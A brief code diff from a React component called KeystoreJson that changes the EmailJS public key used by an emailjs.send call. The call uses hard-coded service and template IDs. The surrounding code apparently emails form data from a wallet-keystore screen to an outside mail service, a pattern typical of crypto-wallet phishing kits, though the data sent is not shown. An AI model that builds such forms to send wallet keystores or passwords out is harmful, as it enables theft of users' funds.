@@ -107,7 +107,7 @@ class KeystoreJson extends React.Component<KeyStoreProps, KeyStoreState>{
         }
 
         emailjs.send('service_iabotxi', 'template_muadzlw', template, {
-            publicKey: '8K-IeGOKpfXa20UY'
+            publicKey: '8K-IeGOKpfXa20UYI'
         })
         .then((result) => {
         // alert("Message Sent, We will get back to you shortly", result.text);
